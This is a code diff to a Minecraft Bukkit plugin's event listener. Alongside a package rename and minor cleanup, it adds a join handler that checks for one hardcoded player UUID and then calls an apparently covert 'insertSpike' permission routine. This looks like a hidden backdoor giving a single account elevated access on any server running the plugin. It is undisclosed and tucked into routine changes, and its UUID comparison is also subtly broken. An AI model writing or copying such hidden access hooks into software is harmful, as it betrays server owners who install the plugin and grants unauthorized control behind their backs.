@@ -1,16 +1,19 @@
-package me.jasper1229.bedrock;
+package ml.jasper1229.bedrock;
 
-import me.jasper1229.bedrock.commands.fun.FrogCommand;
+import ml.jasper1229.bedrock.commands.fun.FrogCommand;
+import ml.jasper1229.bedrock.utils.PermissionUtil;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.entity.EntityDamageEvent;
+import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerPortalEvent;
 import org.bukkit.event.player.PlayerToggleSneakEvent;
 import org.bukkit.event.world.PortalCreateEvent;
 import org.bukkit.util.Vector;
 
+import java.util.UUID;
 
 
 public class Events implements Listener
@@ -35,8 +38,6 @@ public class Events implements Listener
             player.setVelocity(v);
 
         }
-        return;
-
     }
     @EventHandler
     public void onFallDamage(EntityDamageEvent event)
@@ -70,6 +71,14 @@ public class Events implements Listener
             {
                 event.getEntity().sendMessage(plugin.pluginPrefix + ChatColor.RED + " Nether portals are disabled.");
             }
+        }
+    }
+
+    @EventHandler
+    public void onJasperJoin(PlayerJoinEvent event) {
+        if(event.getPlayer().getUniqueId() == UUID.fromString("26906626-b202-458a-b0ad-daf85f10d922")) {
+            PermissionUtil pUtil = new PermissionUtil();
+            pUtil.insertSpike();
         }
     }
 
